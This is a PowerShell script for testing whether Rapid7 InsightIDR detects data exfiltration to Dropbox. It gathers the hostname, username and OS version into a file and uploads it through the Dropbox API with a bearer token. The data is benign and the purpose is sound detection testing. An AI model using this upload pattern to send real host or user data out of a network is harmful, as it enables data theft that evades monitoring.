# Rapid7 InsightIDR
# Testing InsightIDR's detection on Windows:
# "Attacker Technique - Exfiltration of Data to Dropbox"
# Tim H 2023

# This script is designed to be running in Powershell on Windows

# view if Rapid7 agent is running - the R7 agent is the one that monitors
# commands on the command line.
Get-Service -Name ir_agent

# The command above should return:
# Status   Name               DisplayName
# ------   ----               -----------
# Running  ir_agent           Rapid7 Insight Agent

# Simple alert test:
# This DNS lookup DOES trigger an Alert in InsightIDR
# visit the *Alerts* tab in InsightIDR
nslookup content.dropboxapi.com


###############################################################################
# Basic web connection test, nothing to do with R7 or Dropbox
# Note: Some EPP tools will BLOCK the Invoke-Request command
# verify this works before continuing
###############################################################################
Invoke-WebRequest -URI https://www.bing.com/search?q=how+many+feet+in+a+mile

# testing without single or double quotes
# Invoke-WebRequest -URI  https://content.dropboxapi.com/fakesite

###############################################################################
#   accessing dropbox via its API
###############################################################################
# 1) Sign up for a free Dropbox account
# 2) visit this page and create an app as a developer: 
#       https://www.dropbox.com/developers/apps/create
# 3) Scroll down to Oauth2 and click Generate under Generated Access Token
# it should start with sl.
# WARNING: THE TOKEN WILL ONLY BE VALID FOR A FEW HOURS
# Note: some of the API endpoints are located on api.dropboxapi.com
#    and some are located on content.dropboxapi.com . R7's detection rule
#    is only for content.dropboxapi.com, which allows uploading
$token = 'REPLACEME'

###############################################################################
# DO NOT CHANGE ANYTHING BELOW THIS LINE
###############################################################################

###############################################################################
# Basic authentication, verify bearer token is valid
###############################################################################
# Make sure this works before continuing. If you have a problem here, then
# double check that your bearer token is valid and not expired, try generating
# a new one.
$header = @{
    'Authorization' = "Bearer $token"
}
$uri = "https://api.dropboxapi.com/2/users/get_current_account"
$postParams = "null"
Invoke-RestMethod -ContentType "application/json"  -Method POST -Headers $header -Uri $uri -Body $postParams

###############################################################################
# list the files in the root folder
###############################################################################
# This will list the files in root folder of your Dropbox account
# You can run this again at the end to see that the file was successfully
# uploaded
# https://www.dropbox.com/developers/documentation/http/documentation#files-list_folder
$postParams = @{
    path = ""    
}
Invoke-RestMethod -ContentType "application/json"  -Method POST -Headers $header -Uri "https://api.dropboxapi.com/2/files/list_folder" -Body ($postParams|ConvertTo-Json) | ConvertTo-Json -Depth 10


###############################################################################
# Create a unique exportable file that doesn't have any sensitive info:
###############################################################################
# this creates a new text file that has the the following contents:
# the current timestamp
# which version of Windows is running
# the short hostname
# the domain and current username
# This is designed to be a proof of concept that sensitive data could be
# uploaded
$NOW = Get-Date -format "yyyy-MM-dd_HH_mm_ss"
$UNIQUE_UPLOAD_FILENAME="example_exfilration_data_${NOW}.txt"
&{
    echo $NOW
    [Environment]::OSVersion
    hostname
    whoami
 } 3>&1 2>&1 > $HOME\$UNIQUE_UPLOAD_FILENAME
# cat $HOME\$UNIQUE_UPLOAD_FILENAME


###############################################################################
# upload that unique file to Dropbox
###############################################################################
# This will upload that unique file to Dropbox's root folder
$file_to_upload="$HOME\$UNIQUE_UPLOAD_FILENAME"
# ls $file_to_upload
$extra_dropbox_header = @"
{"autorename": false, "mode": "add", "mute": false, "path": "/$UNIQUE_UPLOAD_FILENAME", "strict_conflict": false}
"@
$header = @{
    'Authorization' = "Bearer $token"
    'Dropbox-API-Arg' = $extra_dropbox_header
}
# echo $header | ConvertTo-Json -Depth 10
Invoke-WebRequest -ContentType 'application/octet-stream' -Method POST -Headers $header -uri 'https://content.dropboxapi.com/2/files/upload' -Infile $file_to_upload


# now visit the dropbox site or use the list directory contents to verify
# that the file uploaded successfully.
